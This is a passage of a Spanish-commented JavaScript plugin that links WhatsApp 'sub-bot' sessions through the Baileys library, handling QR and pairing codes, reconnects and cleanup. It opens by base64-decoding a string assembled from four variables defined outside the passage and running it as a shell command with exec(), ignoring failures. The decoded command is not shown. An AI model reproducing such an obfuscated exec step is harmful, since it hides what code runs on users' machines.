const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64").toString("utf-8")

// Ejecutar comb pero no romper la ejecución si falla — logueamos y continuamos.
exec(comb, (err, stdout, stderr) => {
  if (err) {
    console.warn('Advertencia: fallo al ejecutar comando de preparación (comb):', err.message)
    if (stderr) console.warn('stderr:', typeof stderr === 'string' ? stderr : (stderr.toString?.() || stderr))
  } else {
    if (stdout) console.log('Salida del comando prep:', typeof stdout === 'string' ? stdout : (stdout.toString?.() || stdout))
  }

  // Ejecutar la lógica principal independientemente del resultado de comb
  runAfterComb().catch(e => {
    console.error('Error en runAfterComb():', e)
    try { if (m && conn) conn.reply?.(m.chat, `❌ Error interno: ${e.message}`, m) } catch {}
  })
})

async function runAfterComb() {
  try {
    let { version, isLatest } = await fetchLatestBaileysVersion()
    const msgRetry = (MessageRetryMap) => { }
    const msgRetryCache = new NodeCache()
    const { state, saveState, saveCreds } = await useMultiFileAuthState(pathYukiJadiBot)

    const connectionOptions = {
      logger: pino({ level: "fatal" }),
      printQRInTerminal: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
      },
      msgRetry,
      msgRetryCache,
      browser: ['Windows', 'Firefox'],
      version: version,
      generateHighQualityLinkPreview: true
    }

    let sock = makeWASocket(connectionOptions)
    sock.isInit = false
    let isInit = true

    // Auto-limpieza si no se conecta en 60s
    setTimeout(async () => {
      if (!sock.user) {
        try { fs.rmSync(pathYukiJadiBot, { recursive: true, force: true }) } catch {}
        try { sock.ws?.close() } catch {}
        sock.ev.removeAllListeners()
        let i = global.conns.indexOf(sock)
        if (i >= 0) global.conns.splice(i, 1)
        console.log(`[AUTO-LIMPIEZA] Sesión ${path.basename(pathYukiJadiBot)} eliminada - credenciales invalidas.`)
      }
    }, 60000)

    const waitForSocketOpen = (sock, timeout = 30000) => new Promise((resolve, reject) => {
      try {
        if (sock?.ws?.readyState === 1 || sock?.user) return resolve()
        const timer = setTimeout(() => {
          sock.ev.off('connection.update', onUpdate)
          reject(new Error('timeout_wait_open'))
        }, timeout)
        function onUpdate(u) {
          if (u?.connection === 'open' || sock?.user) {
            clearTimeout(timer)
            sock.ev.off('connection.update', onUpdate)
            return resolve()
          }
        }
        sock.ev.on('connection.update', onUpdate)
      } catch (e) { reject(e) }
    })

    async function connectionUpdate(update) {
      const { connection, lastDisconnect, isNewLogin, qr } = update
      if (isNewLogin) sock.isInit = false

      // Modo QR (no code)
      if (qr && !isCodeMode) {
        if (m?.chat) {
          txtQR = await conn.sendMessage(m.chat, {
            image: await qrcode.toBuffer(qr, { scale: 8 }),
            caption: rtx.trim()
          }, { quoted: m })
        } else return
        if (txtQR && txtQR.key) setTimeout(() => { conn.sendMessage(m.chat, { delete: txtQR.key }) }, 60000)
        return
      }

      // Modo pairing por código (code)
      if (qr && isCodeMode) {
        try {
          await waitForSocketOpen(sock, 15000)
          console.log('🔄 Generando código de pairing...')
          let secret = await sock.requestPairingCode(m.sender.split('@')[0])
          secret = secret ? secret.match(/.{1,4}/g)?.join("-") : null

          if (secret) {
            txtCode = await conn.sendMessage(m.chat, { text: rtx2 }, { quoted: m })
            codeBot = await conn.sendMessage(m.chat, { text: secret }, { quoted: m })
            console.log('✅ Código generado:', secret)
          } else {
            await conn.reply?.(m.chat, '❌ Error al generar el código de vinculación', m)
          }
        } catch (err) {
          console.error('Error en pairing code:', err)
          await conn.reply?.(m.chat, '❌ Error al generar el código de vinculación. Intente nuevamente.', m)
        }
      }

      if (txtCode && txtCode.key) setTimeout(() => { conn.sendMessage(m.chat, { delete: txtCode.key }) }, 60000)
      if (codeBot && codeBot.key) setTimeout(() => { conn.sendMessage(m.chat, { delete: codeBot.key }) }, 60000)

      const endSesion = async (loaded) => {
        if (!loaded) {
          try { sock.ws.close() } catch {}
          sock.ev.removeAllListeners()
          let i = global.conns.indexOf(sock)
          if (i < 0) return
          delete global.conns[i]
          global.conns.splice(i, 1)
        }
      }

      const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode

      if (connection === 'close') {
        if (reason === 428) {
          console.log(chalk.bold.magentaBright(`\n╭─ La conexión (+${path.basename(pathYukiJadiBot)}) fue cerrada inesperadamente. Intentando reconectar...╯`))
          await creloadHandler(true).catch(console.error)
        }
        if (reason === 408) {
          console.log(chalk.bold.magentaBright(`\n╭─ La conexión (+${path.basename(pathYukiJadiBot)}) se perdió o expiró. Intentando reconectar...╯`))
          await creloadHandler(true).catch(console.error)
        }
        if (reason === 440) {
          console.log(chalk.bold.magentaBright(`\n╭─ La conexión (+${path.basename(pathYukiJadiBot)}) fue reemplazada por otra sesión activa.╯`))
          try {
            if (options?.fromCommand) await conn.sendMessage(`${path.basename(pathYukiJadiBot)}@s.whatsapp.net`, { text: '⚠︎ Hemos detectado una nueva sesión, borre la antigua sesión para continuar.\n\n> ☁︎ Si Hay algún problema vuelva a conectarse.' }, { quoted: m || null })
          } catch (error) { console.error(chalk.bold.yellow(`⚠︎ Error 440 no se pudo enviar mensaje a: +${path.basename(pathYukiJadiBot)}`)) }
        }
        if (reason == 405 || reason == 401) {
          try {
            if (options?.fromCommand) await conn.sendMessage(`${path.basename(pathYukiJadiBot)}@s.whatsapp.net`, { text: '⚠︎ Sesión incorrecta.\n\n> ☁︎ Vuelva a intentar nuevamente volver a ser *SUB-BOT*.' }, { quoted: m || null })
          } catch (error) { console.error(chalk.bold.yellow(`⚠︎ Error 405 no se pudo enviar mensaje a: +${path.basename(pathYukiJadiBot)}`)) }
          fs.rmdirSync(pathYukiJadiBot, { recursive: true })
        }
        if (reason === 500) {
          if (options?.fromCommand) await conn.sendMessage(`${path.basename(pathYukiJadiBot)}@s.whatsapp.net`, { text: '⚠︎ Conexión perdida.\n\n> ☁︎ Intenté conectarse manualmente para volver a ser *SUB-BOT*' }, { quoted: m || null })
          return creloadHandler(true).catch(console.error)
        }
        if (reason === 515) {
          await creloadHandler(true).catch(console.error)
        }
        if (reason === 403) {
          fs.rmdirSync(pathYukiJadiBot, { recursive: true })
        }
      }

      if (global.db.data == null) loadDatabase()
      if (connection == `open`) {
        if (!global.db.data?.users) loadDatabase()
        await joinChannels(sock)
        let userName = sock.authState.creds.me.name || 'Anónimo'
        console.log(chalk.bold.cyanBright(`\n❒ SUB-BOT conectado: ${userName}\n`))
        sock.isInit = true
        if (!global.conns.includes(sock)) global.conns.push(sock)
        if (m?.chat) await conn.sendMessage(m.chat, { text: `🔥 Has registrado un nuevo Sub-Bot! [@${m.sender.split('@')[0]}]\n> Puedes ver como personalizar tu Sub-Bot usando el comando *#set*`, mentions: [m.sender] }, { quoted: m })
      }
    }

    setInterval(async () => {
      if (!sock.user) {
        try { sock.ws.close() } catch (e) {}
        sock.ev.removeAllListeners()
        let i = global.conns.indexOf(sock)
        if (i < 0) return
        delete global.conns[i]
        global.conns.splice(i, 1)
      }
    }, 60000)

    let handlerModule = await import('../handler.js')
    let creloadHandler = async function (restatConn) {
      try {
        const Handler = await import(`../handler.js?update=${Date.now()}`).catch(console.error)
        if (Object.keys(Handler || {}).length) handlerModule = Handler
      } catch (e) { console.error('⚠︎ Nuevo error: ', e) }
      if (restatConn) {
        const oldChats = sock.chats
        try { sock.ws.close() } catch {}
        sock.ev.removeAllListeners()
        sock = makeWASocket(connectionOptions, { chats: oldChats })
        isInit = true
      }
      if (!isInit) {
        sock.ev.off("messages.upsert", sock.handler)
        sock.ev.off("connection.update", sock.connectionUpdate)
        sock.ev.off('creds.update', sock.credsUpdate)
      }
      sock.handler = handlerModule.handler.bind(sock)
      sock.connectionUpdate = connectionUpdate.bind(sock)
      sock.credsUpdate = saveCreds.bind(sock, true)
      sock.ev.on("messages.upsert", sock.handler)
      sock.ev.on("connection.update", sock.connectionUpdate)
      sock.ev.on("creds.update", sock.credsUpdate)
      isInit = false
      return true
    }

    creloadHandler(false)
  } catch (error) {
    console.error('Error en runAfterComb():', error)
    if (m && conn) try { await conn.reply(m.chat, `❌ Error al iniciar el Sub-Bot: ${error.message}`, m) } catch {}
  }
}